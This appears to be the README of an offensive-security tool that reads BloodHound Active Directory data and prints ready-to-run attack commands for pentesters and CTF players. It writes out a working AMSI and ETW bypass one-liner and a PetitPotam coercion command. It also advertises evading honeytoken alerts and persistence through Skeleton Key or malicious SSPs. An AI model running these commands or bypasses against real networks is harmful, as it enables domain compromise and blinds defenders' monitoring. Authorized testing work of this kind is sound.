# ☥ Pharaohound ☥
> **The Fast-Triage, Command-Generating Active Directory Analysis Engine**

[![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Category: Active Directory](https://img.shields.io/badge/Focus-Active%20Directory%20%26%20Azure-teal.svg)](https://github.com/)

**Pharaohound** is a streaming, concurrent, and highly modular Active Directory (AD) & Hybrid Azure (Entra ID) BloodHound JSON analysis engine. Inspired by the diagnostic wisdom of the ancient gods, it parses raw ingestion collections, maps dangerous paths, scores OpSec risks, and automatically compiles **copy-paste-ready exploitation commands and playbooks** for penetration testers, CTF players, and red team operators.

---

## ⚔ Pharaohound vs. BloodHound: The Hybrid Strategy

### Why use Pharaohound instead of (or before) BloodHound?

In fast-paced environments like **Capture The Flag (CTF) competitions** (e.g., HackTheBox, Pro Labs, OSCP) or time-boxed pentests, setting up the standard BloodHound GUI can be a bottleneck. Pharaohound solves this by offering a lightweight, CLI-first companion:

1. **Eliminate Neo4j & GUI Overhead**: Starting Neo4j, logging in, uploading huge ZIP files, and waiting for graph rendering takes time. On low-resource attack VMs (like a 4GB Kali VM), Neo4j often causes the system to run out of memory or experience heavy lag. Pharaohound streams raw JSON files directly in memory with **parallel ingestion worker threads**, finishing in milliseconds.
2. **Instant Actionable Commands (No Search Required)**: BloodHound shows you relationship paths (e.g., `WriteOwner` or `GenericAll`), but it doesn't give you the commands to exploit them. You have to open a web browser, search for the syntax, and type it manually. Pharaohound generates the exact commands (using modern tools like `Impacket`, `Certipy`, `Coercer`, `BloodHound.py`, and `PowerView`) to execute the attack.
3. **Designed for AD Beginners ("Noobs")**: If you're new to AD hacking, the massive graph web of BloodHound can be overwhelming. Pharaohound's `--noob` mode strips away intermediate graph hops, explains edge meanings in plain English, and outlines the exact step-by-step path to Domain Admin.
4. **Variable & Evasion Pipelines**: Pharaohound lets you feed in operational variables (like domain controller IPs and target credentials) via a simple JSON file (`--vars`) to output 100% copy-paste-ready commands, and can prepend evasion payloads (`--evasion`) to bypass AMSI/ETW dynamically.

> [!IMPORTANT]
> **Pharaohound does NOT replace BloodHound.** It is designed to act as your first-response triage tool.
> Use Pharaohound to immediately identify high-signal paths and exploit low-hanging fruit. If you hit a wall or need to explore highly nested, complex multi-hop paths, import your ZIP collection into the BloodHound GUI for interactive graph queries.

### Comparison Table

| Feature / Scenario | BloodHound (Neo4j GUI) | Pharaohound (CLI Engine) |
| :--- | :--- | :--- |
| **Startup Overhead** | ❌ Minutes (Starts Java Neo4j DB + Electron GUI) | **⚡ Milliseconds** (CLI execution) |
| **System Resources** | ❌ Gigabytes of RAM (Prone to Java VM crashes) | **🟢 Negligible** (Iterative stream parser) |
| **Exploitation Focus** | Relationship visualization | **Actionable commands & playbooks** |
| **CTF & Quick Triage** | ❌ Slow import & laggy graph traversal | **⚡ Instant command line answers** |
| **Beginner Friendly** | ❌ Hard to parse complex nested relationships | **🐣 `--noob` mode** (ELI5 plain-English steps) |
| **Evasion & Playbooks** | None (Static help text) | **⚙ `--vars` interpolation & `--evasion` payloads** |
| **Multi-Hop Graph** | **🟢 Full interactive visual search** | ❌ Vis.js HTML graph export (simpler visual scope) |

---

## 📸 Console Screenshots & Output Examples

Here is how Pharaohound visualizes Active Directory vulnerabilities, maps out detailed step-by-step exploitation playbooks, and generates prioritized recommendations directly in your terminal:

### 1. Prioritized Recommendations & Command Blueprints
Pharaohound analyzes the domain and provides a prioritized remediation and exploitation blueprint, listing exact commands, alternative methods, detection footprints, and defender fixes:
![Prioritized Recommendations and Commands Output](imgs/loggingHTB3.png)

### 2. High-Fidelity Attack Paths
Instead of forcing you to guess how to exploit relationships, Pharaohound spells out the exact exploitation steps and commands needed to reach your target:
![Attack Path Playbook Example - MAQ to RBCD](imgs/loggingHTB2.png)

### 3. Detailed Vulnerability Analyses
For every discovered vulnerability type, Pharaohound generates deep, ELI5 (Explain Like I'm 5) explanations, risk analyses, and defender actions:
![Vulnerability & Finding Analysis Example - Shadow Credentials](imgs/loggingHTB.png)

---

## ⚱ Key Features

*   **⚡ Streaming JSON Parser**: Uses `ijson` to parse multi-gigabyte collections iteratively with flat memory usage. Safely falls back to a custom chunked reader if dependencies are missing.
*   **🧵 Parallel Threading Ingestion**: Ingests users, groups, computers, GPOs, OUs, containers, AD CS certificate templates, CAs, and Azure structures in parallel.
*   **🐚 Navigable Command Shell (`--shell`)**: Drops operators into an interactive command prompt post-analysis to inspect nodes, search relationships, view paths, and retrieve playbook recommendations.
*   **🐣 "Pentest Noob" Mode (`--noob`)**: Translates complex AD relationships into simple step-by-step English instructions and high-signal, bite-sized attack graphs.
*   **⚙ Variable Interpolation (`--vars`)**: Substitutes command placeholders (like `<DC_IP>`, `<PASSWORD>`, `<TARGET_USER>`) dynamically using a custom environment JSON file.
*   **🛡 Tactical Evasion Engine (`--evasion`)**: Automatically prepends AMSI and ETW bypass payloads to PowerShell playbooks.
*   **🎨 Premium Visuals**: Beautiful gold-and-turquoise terminal styling utilizing the `rich` library, with a fallback to lightweight plain-text tables for minimal shell environments.
*   **📝 Multi-Format Reporting**: Generates clean console reports, interactive HTML graph visualizations (using Vis.js), and detailed text summaries.
*   **📢 GitHub Update Notifier**: Automatically and non-blockingly checks for updates on GitHub, notifying the operator if a newer version is available.

---

## 📁 Repository Structure

```text
FullProject/
├── pharaohound/                     # Main Python package
│   ├── __init__.py                  # Version and package info
│   ├── __main__.py                  # Entry point for 'python -m pharaohound'
│   ├── cli.py                       # CLI parsing and engine coordinator
│   ├── attack_paths.py              # Attack path building logic and OpSec scoring
│   ├── graph.py                     # Graph traversal helper utilities
│   ├── intelligence.py              # Remediation and playbooks database
│   ├── models.py                    # BloodHound AD/Azure entity models
│   ├── noob.py                      # "Pentest Noob" mode translator
│   ├── parsers.py                   # Parallel ijson/chunked loader
│   ├── reachability.py              # Compromised user reachability analysis and filtering
│   ├── recommendations.py           # OpSec-Aware prioritizing and recommendations
│   ├── shell.py                     # Interactive CLI post-analysis navigation shell
│   ├── tactical.py                  # Playbook variable interpolation engine
│   ├── theme.py                     # Color themes and glyphs
│   ├── update.py                    # Non-blocking GitHub update notifier client
│   │
│   ├── analyzers/                   # Modular finding analyzers
│   │   ├── __init__.py              # Dynamic analyzer imports list
│   │   ├── base.py                  # BaseAnalyzer and Finding structures
│   │   ├── registry.py              # Self-registering analyzer loader
│   │   ├── kerberoast.py            # Kerberoasting analyzer
│   │   ├── asrep.py                 # ASREP-roasting analyzer
│   │   ├── adcs.py                  # AD CS ESC1-ESC13 analyzer
│   │   ├── azure.py                 # Azure/Hybrid AD paths analyzer
│   │   └── ...                      # 16+ other vulnerability analyzers
│   │
│   └── reporters/                   # Output formatters
│       ├── __init__.py              # Reporters init
│       ├── console.py               # Rich/ASCII console outputs
│       ├── text.py                  # Text file reporter
│       └── html.py                  # Interactive HTML graph reporter
│
├── pharaohound.py                   # Root script launcher wrapper
├── pyproject.toml                   # Modern PEP 517 installation/build file
└── requirements.txt                 # Optional high-performance dependencies
```

---

## 🚀 Installation & Setup

### Install via pipx (Recommended)
The recommended way to install `pharaohound` as a standalone CLI tool is using `pipx`, which automatically sets up a virtual environment and adds the tool to your system PATH:

```bash
pipx install .
```

### Local Script Execution
You can run the script directly from the downloaded repository folder without installing it:
```bash
python pharaohound.py <directory_with_bloodhound_jsons>
```

### Standard pip Installation
Alternatively, install the package using standard pip:
```bash
pip install .
```

Once installed, execute the tool from anywhere via:
```bash
pharaohound <directory_with_bloodhound_jsons>
# OR
python -m pharaohound <directory_with_bloodhound_jsons>
```

---

## 🛠 Usage & Command Line Options

```bash
pharaohound --help
```

### Command Line Flags:
*   `directory`: The folder containing your SharpHound or BloodHound `.json` collections.
*   `-o`, `--output`: Target directory for generating file reports (defaults to `.`).
*   `--format`: Report output format (options: `text`, `html`, `both`, `console-only`; defaults to `both`).
*   `--user`: Compromised user account (`USER@DOMAIN`). Can be specified multiple times to target specific compromised entrypoints.
*   `--all`: Run a full unfiltered scan (skip interactive user selection).
*   `--no-color`: Disable ANSI colored terminal outputs.
*   `--no-rich`: Disable Rich tables (uses fallback ASCII-text tables).
*   `--workers`: Customize parallel worker count for ingestion.
*   `--list-analyzers`: Displays all registered analyzers and exits.
*   `--noob`: Enable "Pentest Noob" mode for simplified jargon-free steps and high-signal focus.
*   `--evasion`: Enable the Tactical Evasion Engine to automatically prepend AMSI and ETW bypass payloads to PowerShell playbooks.
*   `--vars`, `--variables`: JSON configuration file containing environment variables (e.g., target DC IP) to dynamically interpolate playbook placeholders.
*   `--shell`: Drop into the interactive shell after analysis.

---

## ⚙ Playbook Variable Interpolation (`--vars`)

Pharaohound allows operators to supply a variables file to replace default command placeholders (like `<DC_IP>`, `<PASSWORD>`, `<TARGET_USER>`) dynamically.

**Example `vars.json`:**
```json
{
  "domain_controller": "10.10.10.10",
  "dc_hostname": "DC01.CORP.LOCAL",
  "attacker_host": "10.10.14.5",
  "compromised_password": "Password123!",
  "target_user": "Administrator",
  "controlled_computer": "EVIL-WORKSTATION$"
}
```

**Running with Variables:**
```bash
pharaohound testCase --all --vars vars.json
```

Output commands will automatically render with the custom variables populated, making them 100% copy-paste-ready for your terminal.

### Example: Before and After Interpolation

**1. Standard Output (Without `--vars`)**
When running without variables, Pharaohound provides the exact syntax but leaves placeholders for you to fill in:
```bash
pharaohound testCase --all
```
*Generated Command:*
```bash
python3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <UD_HOST> <DC_IP>
```

**2. Interpolated Output (With `--vars`)**
When you provide the `vars.json` file, the engine automatically replaces the placeholders with your live engagement data:
```bash
pharaohound testCase --all --vars vars.json
```
*Generated Command (Copy-Paste Ready):*
```bash
python3 PetitPotam.py -u 'Administrator' -p 'Password123!' <UD_HOST> 10.10.10.10
```
*(Notice how `<DOMAIN_USER>`, `<PASSWORD>`, and `<DC_IP>` were automatically mapped from the JSON file!)*

### Example: Combining Variables with Evasion (`--evasion`)
For maximum operational efficiency, combine variable interpolation with the evasion engine. Pharaohound will fill in your passwords/IPs *and* inject AMSI/ETW bypasses into PowerShell playbooks:

```bash
pharaohound testCase --all --vars vars.json --evasion
```
*Generated Command (Copy-Paste Ready & Evasive):*
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider],0); Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members 'Administrator'
```

---

## 🐚 Interactive Command Shell (`--shell`)

After the initial parsing and analysis is complete, dropping into the interactive shell allows red teams to query results dynamically without re-running scans.

### Available Shell Commands:
*   `help`: Show the shell command helper menu.
*   `stats`: View domain-wide statistics (object count per type, findings, attack paths, recommendations).
*   `nodes [type]`: List loaded AD objects. Filter by type: `user`, `group`, `computer`, `gpo`, `ou`, `domain`, `ca`, `certtemplate`, `azure`.
*   `find <name>`: Search for a node by partial name match.
*   `info <name>`: Show detailed information about a node (SID, properties, incoming/outgoing ACEs, etc.).
*   `paths`: List all discovered attack paths with their corresponding OpSec rating and severity.
*   `path <index>`: Show detailed step-by-step description and exploitation commands for a specific attack path.
*   `recs`: Show prioritized recommendations list with action descriptions, commands, and alt commands.
*   `commands <right>`: Show exploitation playbooks, remediation, and ELI5 descriptions for a specific BloodHound edge/right (e.g. `GenericAll`, `WriteDacl`, `ReadLAPSPassword`).
*   `edges`: List all known edge types with intelligence summaries and threat level.
*   `exit` / `quit`: Exit the interactive shell.

**Example Shell Session:**
```text
  ☥ pharaohound> nodes ca
  Objects (1):
      1. [ca] NANOCA

  ☥ pharaohound> info NANOCA
  Node: NANOCA
  Type: ca
  SID:  ca-guid
  Enabled: True
  Properties:
    web_enrollment: True
    has_editf_flag: True

  ☥ pharaohound> paths
  Attack Paths (13):
      1. [CRITICAL] Administrator Session Hijack via LSASS mini-dump  🟢 SILENT
      2. [HIGH] Domain Takeover via AD CS ESC1 Misconfiguration  🟡 LOW

  ☥ pharaohound> path 2
  Path 2: Domain Takeover via AD CS ESC1 Misconfiguration
  Severity: HIGH  🟡 LOW
  Summary: Request a certificate for Domain Admin via ESC1 Template
  Steps:
    1. You control a low-priv user.
    2. Query vulnerable templates.
    3. Run Certipy to request the certificate specifying UPN.
```

---

## ☥ List of Built-In Analyzers

Pharaohound executes a comprehensive suite of 24+ automated diagnostic analyzers:

### 🔑 Kerberos & Authentication Attacks
*   **Kerberoastable Users**: Identifies SPN-enabled accounts, prioritizing those in high-value groups.
*   **ASREP-Roasting**: Finds accounts with Kerberos pre-authentication disabled.
*   **Advanced Kerberos Evasion**: Detects AS-REP Roasting downgrades and Pass-the-Certificate (PTC) pathways.
*   **Ticket Forging & Constrained Delegation**: Detects Golden/Silver ticket forging capabilities via compromised `krbtgt` or service accounts.

### 🛡 Delegation Abuse
*   **Unconstrained Delegation**: Finds computers where Kerberos ticket harvesting is possible.
*   **Constrained Delegation**: Identifies delegation paths to domain computers.
*   **gMSA Password Readers**: Detects accounts authorized to read managed passwords of Group Managed Service Accounts (gMSAs).

### 🎫 Active Directory Certificate Services (AD CS)
*   **AD CS Certificate Abuse (ESC1 - ESC13)**: Detects privilege escalation vectors in Active Directory Certificate Services (including template misconfigurations, weak CA security descriptors, weak binding enforcement, custom Policy OIDs, **ESC11** RPC encryption status, and **ESC12** YubiHSM key storage registry credential risk).

### ☁ Azure & Hybrid Entra ID Abuse
*   **Azure Hybrid Paths**: Analyzes Azure AD Connect Sync Server Takeover paths, AppRole/Owner privilege abuse, and Azure VM Contributor Pivots.
*   **Advanced Azure & Entra ID Abuse**: Identifies Seamless SSO (AZUREADSSOACC) abuse, Primary Refresh Token (PRT) extraction paths, and Intune MDM pushes.

### 🏗 Group Policy & Active Directory Structure
*   **Dangerous ACLs**: Identifies dangerous object control permissions (`GenericAll`, `WriteDacl`, `WriteOwner`, etc.).
*   **Group Policy (GPO) Abuse**: Analyzes paths to exploit misconfigured GPOs linked to sensitive OUs.
*   **Self-Add to Group**: Finds accounts with permissions to add themselves to groups they are not currently in.
*   **AD Trust Integrity**: Detects external/foreign trusts vulnerability paths.
*   **Machine Account Quota (MAQ)**: Analyzes domain setting `ms-DS-MachineAccountQuota` to check Resource-Based Constrained Delegation (RBCD) viability.

### ⚙ Infrastructure, Stealth & Persistence
*   **Infrastructure Abuse**: Maps pathways to take over SCCM, WSUS, and Exchange Trusted Subsystems.
*   **GPP & LAPS Decryption**: Identifies legacy Group Policy Preferences `cpassword` exposure and integrates Windows LAPS v2 decryption paths.
*   **AD Architecture & Stealth**: Maps Cross-Forest SID History hopping, Bastion Forest PAM Trusts, WebClient Coercion, and DCSync stealth targets.
*   **Advanced Persistence**: Detects vectors for installing Skeleton Key or Malicious SSPs on Domain Controllers.
*   **Honeytoken Filtering**: Detects and highlights decoy accounts (e.g., admin accounts with zero logons) to prevent triggering high-fidelity defense alerts.
*   **OS Vulnerabilities**: Identifies outdated or vulnerable Windows operating system versions on host nodes.
*   **Password Policy**: Analyzes domain password policies, expiry flags, and maximum password age settings.
